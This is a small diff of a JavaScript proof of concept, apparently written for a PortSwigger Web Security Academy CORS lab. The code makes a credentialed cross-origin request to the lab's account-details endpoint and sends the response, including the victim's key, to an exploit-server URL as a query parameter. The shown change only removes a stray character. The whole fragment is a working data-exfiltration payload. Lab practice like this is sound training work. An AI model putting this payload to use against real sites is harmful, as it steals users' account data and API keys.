@@ -9,7 +9,7 @@ var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://0a5e001604755cf383449114000100a9.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
-req.send();k
+req.send();
 
 function reqListener() {
 	location='https://exploit-0a19000c04eb5cb7831d901401560077.exploit-server.net/exploit?key='+this.responseText;
